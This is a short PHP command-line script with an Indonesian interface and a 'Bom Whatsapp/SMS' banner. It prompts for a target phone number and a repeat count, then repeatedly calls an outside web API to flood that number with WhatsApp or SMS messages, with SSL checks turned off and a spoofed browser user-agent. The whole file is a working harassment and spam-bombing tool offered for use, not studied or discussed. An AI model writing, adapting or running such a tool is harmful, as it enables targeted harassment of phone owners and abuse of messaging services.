<?php
function curl($url, $ua = null){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_COOKIEFILE, 'cok.txt');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $ua);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	$result = curl_exec($ch);
	return $result;

}
$ua = array(
"Host: api-peking404.000webhostapp.com",
"user-agent: Mozilla/5.0 (Linux; Android 6.0.1; SM-J500G Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36",
"accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    );
echo "
╭━━━╮╱╱╭╮╱╱╱╱╱╱╱╱╭╮╱╭┳━━━┳╮╱╭╮
┃╭━╮┃╱╱┃┃╱╱╱╱╱╱╱╱┃┃╱┃┃╭━╮┃┃╱┃┃
┃╰━╯┣━━┫┃╭┳┳━╮╭━━┫╰━╯┃┃┃┃┃╰━╯┃
┃╭━━┫┃━┫╰╯╋┫╭╮┫╭╮┣━━╮┃┃┃┃┣━━╮┃
┃┃╱╱┃┃━┫╭╮┫┃┃┃┃╰╯┃╱╱┃┃╰━╯┃╱╱┃┃
╰╯╱╱╰━━┻╯╰┻┻╯╰┻━╮┃╱╱╰┻━━━╯╱╱╰╯
╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━╯┃
╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰━━╯Bom Whatsapp/SMS\n\nThanks To : Muhammad Ikhsan Aprilyadi\n\n";
echo "[1] Whatsapp\n[2] SMS\nPilih: ";
$pil = trim(fgets(STDIN));
echo "[*] Nomor Target:  ";
$no = trim(fgets(STDIN));
echo "[*] Jumlah:  ";
$jum = trim(fgets(STDIN));
if($pil == 1){
for ($a = 0; $a < $jum; $a++){
$send = curl("https://api-peking404.000webhostapp.com/wa.php?no=$no", $ua);
print_r($send);
   }
}
if($pil == 2){
	for ($a = 0; $a < $jum; $a++){
		$send = curl("https://api-peking404.000webhostapp.com/duar.php?no=$no", $ua);
print_r($send);
    }
}
?>
